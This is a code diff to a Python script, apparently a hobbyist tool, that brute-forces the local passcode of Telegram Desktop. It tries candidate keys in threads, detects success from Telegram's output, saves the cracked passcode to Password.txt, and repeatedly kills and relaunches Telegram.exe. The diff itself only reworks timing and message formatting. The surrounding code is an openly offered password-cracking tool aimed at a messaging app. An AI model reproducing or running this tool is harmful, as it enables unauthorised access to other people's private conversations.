@@ -88,10 +88,9 @@ def bruteforce():
         start_new_thread(tryed,(key,))
         if "reading encrypted user settings" in t1:
             system("color a")
-            total_time2 = time()
-            total_time = str(total_time2 - total_time1)+" Second"
-            ins = "\nTotal Time: "+"\n"+"+-"*20+"+"+"\n"+"|I|n|s|t|a|g|r|a|m|:|S|r|d|r|N|a|g|h|d|i|"+"\n"+"+-"*20+"+"
-            mes = "Passcode:\n"+key+" ==> "+str(datetime.now())[:19]+"\n"+total_time+ins
+            total_time = str(time() - time1)+" Second"
+            ins = "Total Time: "+total_time+"\n"+"+-"*20+"+"+"\n"+"|I|n|s|t|a|g|r|a|m|:|S|r|d|r|N|a|g|h|d|i|"+"\n"+"+-"*20+"+"
+            mes = "Passcode:\n"+key+" ==> "+str(datetime.now())[:19]+"\n"+ins
             t = open("Password.txt","w+")
             t.write(mes)
             t.close()
@@ -103,8 +102,7 @@ def bruteforce():
         if counter == 3:
             counter=0
             tkot()
-    total_time2 = time()
-    total_time = "Total Time:\n"+str(total_time2 - total_time1)+" Second"
+    total_time = "Total Time:\n"+str(time() - time1)+" Second"
     print "Passcode Not Find :("
     Popen("taskkill -f /IM Telegram.exe" , shell=True , stdout = PIPE,stderr=PIPE,stdin=PIPE)
 #TaskKill and OpenTelegram(T-K-O-T)
@@ -116,7 +114,7 @@ def tkot():
     Popen(order , shell=True , stdout = PIPE,stderr=PIPE,stdin=PIPE)
     sleep(5.5)
 if path.exists("Telegram.exe") == True:
-    total_time1 = time()
+    time1 = time()
     tkot()
     bruteforce()
 else:
